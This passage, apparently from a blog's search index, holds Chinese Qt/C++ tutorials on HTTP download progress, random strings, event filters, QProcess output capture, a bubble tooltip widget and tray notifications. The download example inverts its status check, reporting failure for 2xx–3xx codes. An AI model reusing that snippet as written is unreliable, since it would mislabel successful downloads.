1000 / (timeNow - m_timeInterval); QString strSpeed = transformUnit(ispeed, true); ui.labelSpeed-&gt;setText(strSpeed); // 剩余时间; qint64 timeRemain = (bytesTotal - bytesReceived) / ispeed; ui.labelRemainTime-&gt;setText(transformTime(timeRemain)); ui.labelCurrentDownload-&gt;setText(transformUnit(m_currentDownload)); ui.labelFileSize-&gt;setText(transformUnit(bytesTotal)); m_intervalDownload = 0; m_timeInterval = timeNow; &#125;&#125; // 下载完成;void MyHttpDownload::onReplyFinished(int statusCode)&#123; // 根据状态码判断当前下载是否出错; if (statusCode &gt;= 200 &amp;&amp; statusCode &lt; 400) &#123; qDebug() &lt;&lt; &quot;Download Failed&quot;; &#125; else &#123; qDebug() &lt;&lt; &quot;Download Success&quot;; &#125;&#125; // 转换单位;QString MyHttpDownload::transformUnit(qint64 bytes , bool isSpeed)&#123; QString strUnit = &quot; B&quot;; if (bytes &lt;= 0) &#123; bytes = 0; &#125; else if (bytes &lt; UNIT_KB) &#123; &#125; else if (bytes &lt; UNIT_MB) &#123; bytes /= UNIT_KB; strUnit = &quot; KB&quot;; &#125; else if (bytes &lt; UNIT_GB) &#123; bytes /= UNIT_MB; strUnit = &quot; MB&quot;; &#125; else if (bytes &gt; UNIT_GB) &#123; bytes /= UNIT_GB; strUnit = &quot; GB&quot;; &#125; if (isSpeed) &#123; strUnit += &quot;/S&quot;; &#125; return QString(&quot;%1%2&quot;).arg(bytes).arg(strUnit);&#125; // 转换时间;QString MyHttpDownload::transformTime(qint64 seconds)&#123; QString strValue; QString strSpacing(&quot; &quot;); if (seconds &lt;= 0) &#123; strValue = QString(&quot;%1s&quot;).arg(0); &#125; else if (seconds &lt; 60) &#123; strValue = QString(&quot;%1s&quot;).arg(seconds); &#125; else if (seconds &lt; 60 * 60) &#123; int nMinute = seconds / 60; int nSecond = seconds - nMinute * 60; strValue = QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; else if (seconds &lt; 60 * 60 * 24) &#123; int nHour = seconds / (60 * 60); int nMinute = (seconds - nHour * 60 * 60) / 60; int nSecond = seconds - nHour * 60 * 60 - nMinute * 60; strValue = QString(&quot;%1h&quot;).arg(nHour); if (nMinute &gt; 0) strValue += strSpacing + QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; else &#123; int nDay = seconds / (60 * 60 * 24); int nHour = (seconds - nDay * 60 * 60 * 24) / (60 * 60); int nMinute = (seconds - nDay * 60 * 60 * 24 - nHour * 60 * 60) / 60; int nSecond = seconds - nDay * 60 * 60 * 24 - nHour * 60 * 60 - nMinute * 60; strValue = QString(&quot;%1d&quot;).arg(nDay); if (nHour &gt; 0) strValue += strSpacing + QString(&quot;%1h&quot;).arg(nHour); if (nMinute &gt; 0) strValue += strSpacing + QString(&quot;%1m&quot;).arg(nMinute); if (nSecond &gt; 0) strValue += strSpacing + QString(&quot;%1s&quot;).arg(nSecond); &#125; return strValue;&#125; 标注： 代码注释中提到可以根据URL来获取文件名，下方给予解释说明。 QString QUrl::fileName(ComponentFormattingOptions options &#x3D; FullyDecoded) constReturns the name of the file, excluding the directory path.Note that, if this QUrl object is given a path ending in a slash, the name of the file is considered empty.If the path doesn’t contain any slash, it is fully returned as the fileName. 在Qt助手中我们找到此方法，根据加粗的字段可以看出fileName()方法也可能返回为空，所以不是都有效。","tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/tags/HTTP/"},{"name":"QNetWork","slug":"QNetWork","permalink":"http://example.com/tags/QNetWork/"},{"name":"QNetworkRequest","slug":"QNetworkRequest","permalink":"http://example.com/tags/QNetworkRequest/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"随机字符串","date":"2023-10-27T01:24:02.240Z","path":"B_Code/Qt/Qt 随机字符串/","text":"Qt生成自定义字符串 1234567891011121314151617qsrand(QDateTime::currentMSecsSinceEpoch());const char ch[] = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;int size = sizeof(ch);char* str = new char[nLen + 1];int num = 0;for (int nIndex = 0; nIndex &lt; nLen; ++nIndex)&#123; num = rand() % (size - 1); str[nIndex] = ch[num];&#125;str[nLen] = &#x27;\\0&#x27;;QString res(str); QLOG_INFO() &lt;&lt; __FUNCTION__ &lt;&lt; __LINE__ &lt;&lt; res; m_RandomCode = res;","tags":[{"name":"字符串","slug":"字符串","permalink":"http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt事件过滤器（eventFilter）","date":"2023-10-27T01:24:02.240Z","path":"B_Code/Qt/Qt 过滤器/","text":"[toc] 事件过滤器1void QObject::installEventFilter(QObject *filterObj) 1bool eventFilter(QObject *obj, QEvent *event); Qt的事件过滤由以上两个方法实现，首先安装一个事件过滤器，然后重写 bool eventFilter(QObject *obj, QEvent *event)。 filterObj表示事件筛选器对象，它接收发送到此QObject对象的所有事件。筛选器可以停止事件，也可以将事件转发给此QObject对象。事件过滤器filterObj通过它的eventFilter()函数接收事件。 简单实现 当鼠标进入 lineEdit 的时候并且操作时 HoverEnter 的时候，则修改 QLabel 的颜色。 安装事件过滤器 1ui-&gt;lineEdit-&gt;installEventFilter(this); 重写 eventFilter() 1234567891011121314151617181920bool Widget::eventFilter(QObject *wcg, QEvent *event)&#123; if (wcg == ui-&gt;lineEdit) &#123; if(event-&gt;type() == QEvent::HoverEnter) &#123; ui-&gt;label_2-&gt;setText(QString(&quot;进入&quot;)); ui-&gt;label_2-&gt;setStyleSheet(&quot;QLabel&#123;color:red;&#125;&quot;); qDebug() &lt;&lt; &quot;进入&quot; &lt;&lt; endl; &#125; else if(event-&gt;type() == QEvent::HoverLeave) &#123; ui-&gt;label_2-&gt;setText(QString(&quot;离开&quot;)); ui-&gt;label_2-&gt;setStyleSheet(&quot;QLabel&#123;color:green;&#125;&quot;); qDebug() &lt;&lt; &quot;离开&quot; &lt;&lt; endl; &#125; &#125; return QWidget::eventFilter(wcg,event);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"","date":"2023-10-27T01:24:02.239Z","path":"B_Code/Qt/Qt 获取cmd输出 /","text":"Qt 使用 QProcess 执行命令行脚本，并通过 readAllStandardOutput 获取其输出。 123456789101112131415161718192021222324252627#include &lt;QCoreApplication&gt;#include &lt;QProcess&gt;#include &lt;QDebug&gt;int main(int argc, char *argv[])&#123; QCoreApplication a(argc, argv); // 创建一个QProcess对象 QProcess cmdProcess; // 设置要执行的命令 QString command = &quot;your_cmd_command&quot;; // 启动命令并等待它完成 cmdProcess.start(command); cmdProcess.waitForFinished(); // 获取命令输出 QByteArray output = cmdProcess.readAllStandardOutput(); // 将输出转换为字符串并输出 QString outputStr = QString::fromLocal8Bit(output); qDebug() &lt;&lt; outputStr; return a.exec();&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"cmd","slug":"cmd","permalink":"http://example.com/tags/cmd/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt 自定义气泡","date":"2023-10-27T01:24:02.238Z","path":"B_Code/Qt/Qt 自定义气泡/","text":"[toc] Qt 自定义气泡 效果 实现逻辑1. 绘制弹出的气泡 弹出气泡的主要部分已经用ui文件生成了，剩下的就是气泡的三角区域，也是比较难的一个部分 1.1 ui文件代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;qFloatWidget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;qFloatWidget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;191&lt;/width&gt; &lt;height&gt;105&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Form&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;0&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_4&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label_2&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;2&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_3&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;1&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt; 1.2绘制三角区域代码三角区域的位置可以根据自己的需求修改。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162QPainter painter(this); QPainterPath drawPath; painter.setRenderHint(QPainter::Antialiasing, true); // painter.setPen(QPen(Qt::blue, 1)); painter.setPen(Qt::NoPen); painter.setBrush(Qt::white); // 小三角区域; QPolygon trianglePolygon; QRect myRect(ui-&gt;stackedWidget-&gt;x(), ui-&gt;stackedWidget-&gt;y(), ui-&gt;stackedWidget-&gt;width(), ui-&gt;stackedWidget-&gt;height()); // 设置小三的具体位置 int tri_pos_x, tri_pos_y; m_offset = ui-&gt;stackedWidget-&gt;width() / 2 - m_triangleWidth / 2; switch (derect) &#123; case up:&#123; // 小三角左边的点的位置 tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); // 小三角起点 trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y - m_triangleHeight); &#125; break; case left:&#123; // 小三上边点的位置 tri_pos_x = myRect.x(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x - m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case right:&#123; // 小三上边点的位置 tri_pos_x = myRect.x() + myRect.width(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case down:&#123; // 小三左边点的位置 tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y() + myRect.height(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y + m_triangleHeight); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); &#125; break; default: break; &#125; drawPath.addRoundedRect(myRect, BORDER_RADIUS, BORDER_RADIUS); drawPath.addPolygon(trianglePolygon); painter.drawPath(drawPath); 以上就是主要的绘图事件，创建了一个带三角的气泡界面。接下来就是在主界面去响应了。 2. 鼠标事件鼠标时间还是用到了QLabel的过滤器，监听 QEvent::Enter 和 QEvent::Leave 两个事件。具体代码如下所示： 12345678910111213141516171819202122232425262728293031bool Widget::eventFilter(QObject *obj, QEvent *event)&#123; QString str = QString(&quot;&lt;style&gt; span &#123;text-decoration: none; color: #006FFF;font-family: Microsoft YaHei;&#125;&lt;/style&gt; &lt;span&gt;连接%1&lt;/span&gt; &lt;br&gt; 虚拟地址：%2&lt;br&gt;登录地址：%3&quot;).arg(&quot;已成功&quot;).arg(&quot;192.168.0.0&quot;).arg(&quot;192.168.0.1&quot;); static int x = 0; static int y = 0; static uint8_t flag=0; if(obj == ui-&gt;label) &#123; if(event-&gt;type() == QEvent::Enter) &#123; ui-&gt;label-&gt;setText(&quot;进入&quot;); QPoint GlobalPoint(ui-&gt;label-&gt;mapToGlobal(QPoint(0, 0)));//获取控件在窗体中的坐标 x = GlobalPoint.x(); y = GlobalPoint.y() + ui-&gt;label-&gt;height(); qDebug() &lt;&lt; x &lt;&lt; &quot;:&quot; &lt;&lt; y ; m_widget-&gt;myMove(x, y); m_widget-&gt;setDerection(qFloatWidget::up); m_widget-&gt;show(); &#125; else if(event-&gt;type() == QEvent::Leave) &#123; ui-&gt;label-&gt;setText((&quot;离开&quot;)); m_widget-&gt;hide(); &#125; &#125; return QWidget::eventFilter(obj,event);&#125; 3. 动画动画内容比较简单，只需要创建一个简单的位移动画就可以了，当然也可以去掉动画，直接让气泡弹出。 12345678// 添加动画// 位移QPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(m_widget, &quot;pos&quot;);pPosAnimation1-&gt;setDuration(1000);pPosAnimation1-&gt;setStartValue(QCursor::pos());pPosAnimation1-&gt;setEndValue(QPoint(x,y));pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad);pPosAnimation1-&gt;start(); 完整代码QFloatWidget.h1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#ifndef QFLOATWIDGET_H#define QFLOATWIDGET_H#include &lt;QWidget&gt;#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endifconst int SHADOW_WIDTH = 30; // 窗口阴影宽度;const int TRIANGLE_WIDTH = 30; // 小三角的宽度;const int TRIANGLE_HEIGHT = 10; // 小三角的高度;const int BORDER_RADIUS = 15; // 窗口边角的弧度;namespace Ui &#123;class qFloatWidget;&#125;class qFloatWidget : public QWidget&#123; Q_OBJECTpublic: qFloatWidget(QWidget *parent = nullptr); ~qFloatWidget(); enum Derection&#123; left, right, up, down &#125;; // 设置小三角起始位置; void setStartPos(int startX); // 设置小三角宽和高; void setTriangleInfo(int width, int height); // 设置小三角的位置 void setDerection(Derection d); // 比起左上角的位置 用户更关心小三角的尖尖的位置 重载move以便用户更容易定位气泡框的位置 // x,y 是气泡窗口小贱贱的坐标 void myMove(int x, int y); void setWidgetIndex(int i);protected: void paintEvent(QPaintEvent *);private: // 小三角的偏移量; int m_offset; // 小三角的宽度; int m_triangleWidth; // 小三角高度; int m_triangleHeight; Derection derect; Ui::qFloatWidget *ui;&#125;;#endif // QFLOATWIDGET_H QFloatWidget.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#include &quot;qfloatwidget.h&quot;#include &quot;ui_qfloatwidget.h&quot;#include &lt;QGraphicsDropShadowEffect&gt;#include &lt;QHBoxLayout&gt;#include &lt;QPoint&gt;#include &lt;QPainter&gt;#include &lt;QImage&gt;#include &lt;QVariant&gt;#include &lt;QPropertyAnimation&gt;qFloatWidget::qFloatWidget(QWidget *parent) : QWidget(parent), m_offset(50), m_triangleWidth(TRIANGLE_WIDTH), m_triangleHeight(TRIANGLE_HEIGHT), ui(new Ui::qFloatWidget)&#123; ui-&gt;setupUi(this); setWindowFlags(Qt::FramelessWindowHint); setAttribute(Qt::WA_TranslucentBackground); setAttribute(Qt::WA_NoSystemBackground); //设置具体阴影 QGraphicsDropShadowEffect *shadow_effect = new QGraphicsDropShadowEffect(this); shadow_effect-&gt;setOffset(0, 0); shadow_effect-&gt;setColor(QColor(0, 133, 255)); shadow_effect-&gt;setBlurRadius(5); this-&gt;setGraphicsEffect(shadow_effect);&#125;qFloatWidget::~qFloatWidget()&#123; delete ui;&#125;void qFloatWidget::setStartPos(int startX)&#123; m_offset = startX; repaint();&#125;void qFloatWidget::setTriangleInfo(int width, int height)&#123; m_triangleWidth = width; m_triangleHeight = height;&#125;void qFloatWidget::setDerection(Derection d)&#123; derect = d;&#125;void qFloatWidget::myMove(int x, int y)&#123; int top_left_x, top_left_y; switch (derect) &#123; case down: top_left_x = x - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_triangleHeight - ui-&gt;stackedWidget-&gt;height() - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case up: top_left_x = x - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;x(); top_left_y = y + m_triangleHeight - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case left: top_left_x = x + m_triangleHeight - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_offset - m_triangleWidth / 2 - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; case right: top_left_x = x - m_triangleHeight - ui-&gt;stackedWidget-&gt;width() - ui-&gt;stackedWidget-&gt;x(); top_left_y = y - m_triangleWidth / 2 - m_offset - ui-&gt;stackedWidget-&gt;y(); move(QPoint(top_left_x, top_left_y)); break; default: break; &#125;&#125;void qFloatWidget::setWidgetIndex(int i)&#123; ui-&gt;stackedWidget-&gt;setCurrentIndex(i);&#125;void qFloatWidget::paintEvent(QPaintEvent *)&#123; QPainter painter(this); QPainterPath drawPath; painter.setRenderHint(QPainter::Antialiasing, true); // painter.setPen(QPen(Qt::blue, 1)); painter.setPen(Qt::NoPen); painter.setBrush(Qt::white); // 小三角区域; QPolygon trianglePolygon; QRect myRect(ui-&gt;stackedWidget-&gt;x(), ui-&gt;stackedWidget-&gt;y(), ui-&gt;stackedWidget-&gt;width(), ui-&gt;stackedWidget-&gt;height()); // 设置小三的具体位置 int tri_pos_x, tri_pos_y; m_offset = ui-&gt;stackedWidget-&gt;width() / 2 - m_triangleWidth / 2; switch (derect) &#123; case up:&#123; // 小三角左边的点的位置 tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); // 小三角起点 trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y - m_triangleHeight); &#125; break; case left:&#123; // 小三上边点的位置 tri_pos_x = myRect.x(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x - m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case right:&#123; // 小三上边点的位置 tri_pos_x = myRect.x() + myRect.width(); tri_pos_y = myRect.y() + m_offset; trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleHeight, tri_pos_y + m_triangleWidth / 2); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y + m_triangleWidth); &#125; break; case down:&#123; // 小三左边点的位置 tri_pos_x = myRect.x() + m_offset; tri_pos_y = myRect.y() + myRect.height(); trianglePolygon &lt;&lt; QPoint(tri_pos_x, tri_pos_y); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth / 2, tri_pos_y + m_triangleHeight); trianglePolygon &lt;&lt; QPoint(tri_pos_x + m_triangleWidth, tri_pos_y); &#125; break; default: break; &#125; drawPath.addRoundedRect(myRect, BORDER_RADIUS, BORDER_RADIUS); drawPath.addPolygon(trianglePolygon); painter.drawPath(drawPath);&#125; QFloatWidget.ui123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;qFloatWidget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;qFloatWidget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;191&lt;/width&gt; &lt;height&gt;105&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Form&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;0&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_4&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label_2&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;2&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_3&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;1&lt;/string&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt; widget.h12345678910111213141516171819202122232425262728293031323334#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QMouseEvent&gt;#include &quot;qmylabel.h&quot;#include &quot;qfloatwidget.h&quot;#if defined(_MSC_VER) &amp;&amp; (_MSC_VER &gt;= 1600) #pragma execution_character_set(&quot;utf-8&quot;)#endifQT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();protected: bool eventFilter(QObject *obj, QEvent *event);private: Ui::Widget *ui; qFloatWidget *m_widget;&#125;;#endif // WIDGET_H widget.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;#include &lt;QDebug&gt;#include&lt;QPropertyAnimation&gt;#include &lt;QGraphicsEffect&gt;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); m_widget = new qFloatWidget(); ui-&gt;label-&gt;installEventFilter(this);&#125;Widget::~Widget()&#123; delete ui;&#125;bool Widget::eventFilter(QObject *obj, QEvent *event)&#123; QString str = QString(&quot;&lt;style&gt; span &#123;text-decoration: none; color: #006FFF;font-family: Microsoft YaHei;&#125;&lt;/style&gt; &lt;span&gt;连接%1&lt;/span&gt; &lt;br&gt; 虚拟地址：%2&lt;br&gt;登录地址：%3&quot;).arg(&quot;已成功&quot;).arg(&quot;192.168.0.0&quot;).arg(&quot;192.168.0.1&quot;); static int x = 0; static int y = 0; static uint8_t flag=0; if(obj == ui-&gt;label) &#123; if(event-&gt;type() == QEvent::Enter) &#123; ui-&gt;label-&gt;setText(&quot;进入&quot;); QPoint GlobalPoint(ui-&gt;label-&gt;mapToGlobal(QPoint(0, 0)));//获取控件在窗体中的坐标 x = GlobalPoint.x(); y = GlobalPoint.y() + ui-&gt;label-&gt;height(); qDebug() &lt;&lt; x &lt;&lt; &quot;:&quot; &lt;&lt; y ; m_widget-&gt;myMove(x, y); m_widget-&gt;setDerection(qFloatWidget::up); m_widget-&gt;show(); &#125; else if(event-&gt;type() == QEvent::Leave) &#123; ui-&gt;label-&gt;setText((&quot;离开&quot;)); m_widget-&gt;hide(); &#125; &#125; // 添加动画 // 位移 QPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(m_widget, &quot;pos&quot;); pPosAnimation1-&gt;setDuration(1000); pPosAnimation1-&gt;setStartValue(QCursor::pos()); pPosAnimation1-&gt;setEndValue(QPoint(x,y)); pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad); pPosAnimation1-&gt;start(); return QWidget::eventFilter(obj,event);&#125; widget.ui12345678910111213141516171819202122232425262728293031323334&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;Widget&lt;/class&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;Widget&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;497&lt;/width&gt; &lt;height&gt;252&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Widget&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QLabel&quot; name=&quot;label&quot;&gt; &lt;property name=&quot;text&quot;&gt; &lt;string&gt;123123123123&lt;/string&gt; &lt;/property&gt; &lt;property name=&quot;textFormat&quot;&gt; &lt;enum&gt;Qt::PlainText&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;wordWrap&quot;&gt; &lt;bool&gt;false&lt;/bool&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections/&gt;&lt;/ui&gt;","tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"气泡","slug":"气泡","permalink":"http://example.com/tags/%E6%B0%94%E6%B3%A1/"},{"name":"自定义控件","slug":"自定义控件","permalink":"http://example.com/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"Qt在Win系统上的消息通知","date":"2023-10-27T01:24:02.237Z","path":"B_Code/Qt/Qt Win消息通知/","text":"[TOC] 需求描述： Qt应用程序在windows系统上发送win消息通知 演示 代码代码实现很简单，主要调用的接口为QSystemTrayIcon.showMessage() 使用的Demo为 【Qt】 鼠标 hover 操作时弹出文字气泡_欧恩意的博客-CSDN博客 这篇文章，结合图片隐藏显示，在系统显示通知。 widget.h1234567891011121314151617181920212223242526272829303132#ifndef WIDGET_H#define WIDGET_H#include &lt;QWidget&gt;#include &lt;QImage&gt;#include &lt;QPixmap&gt;#include &lt;QSystemTrayIcon&gt;#include &lt;QMenu&gt;#include &lt;QIcon&gt;#include &lt;QAction&gt;QT_BEGIN_NAMESPACEnamespace Ui &#123; class Widget; &#125;QT_END_NAMESPACEclass Widget : public QWidget&#123; Q_OBJECTpublic: Widget(QWidget *parent = nullptr); ~Widget();public: QSystemTrayIcon *trayIcon;private slots: void stTrayIconActive(QSystemTrayIcon::ActivationReason acReason); void on_pushButton_clicked();private: Ui::Widget *ui;&#125;;#endif // WIDGET_H widget.cpp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &quot;widget.h&quot;#include &quot;ui_widget.h&quot;Widget::Widget(QWidget *parent) : QWidget(parent) , ui(new Ui::Widget)&#123; ui-&gt;setupUi(this); QPixmap 